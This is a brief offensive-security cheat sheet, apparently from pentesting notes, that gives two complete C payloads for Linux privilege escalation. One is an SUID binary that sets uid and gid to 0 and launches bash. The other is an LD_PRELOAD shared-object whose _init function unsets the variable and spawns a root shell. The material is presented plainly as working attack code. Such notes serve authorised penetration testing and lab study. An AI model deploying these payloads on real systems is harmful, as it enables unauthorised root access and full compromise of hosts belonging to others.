- Simple binary for SUID exploitation
	```C
	#include <unistd.h>
	#include <err.h>
	#include <stdio.h>
	#include <sys/types.h>
	
	int main(void) {
	        if (setuid(0) || setgid(0))
	                err(1, "setuid/setgid");
	        fputs("We are root! Cthulhu fhtagn!\n", stderr);
	        execl("/bin/bash", "bash", NULL);
	        err(1, "execl");
	}
	```

- Simple LD_PRELOAD privesc binary
	```C
	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>
	
	void _init() {
	    unsetenv("LD_PRELOAD");
	    setgid(0);
	    setuid(0);
	    system("/bin/bash");
	}
	```